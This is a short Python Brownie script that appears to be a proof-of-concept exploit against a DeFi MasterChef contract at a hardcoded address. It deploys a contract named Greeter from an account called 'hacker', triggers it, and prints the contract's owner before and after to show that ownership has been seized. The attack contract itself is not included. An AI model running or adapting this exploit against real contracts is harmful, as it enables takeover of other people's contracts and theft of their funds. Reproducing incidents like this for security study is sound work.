from brownie import accounts, interface, Greeter

cross_master_chef = interface.IMasterChef('0x70873211CB64c1D4EC027Ea63A399A7d07c4085B')

def main():
    hacker = accounts[0]
    print('deploy contract greeter...')
    greeter = Greeter.deploy({'from': hacker})
    print('[Before] the owner of cross is: ', cross_master_chef.owner())
    greeter.greet({'from': hacker})
    print(f'[After] the owner of cross is: {cross_master_chef.owner()} (BTW: the addres of greeter is {greeter.address})')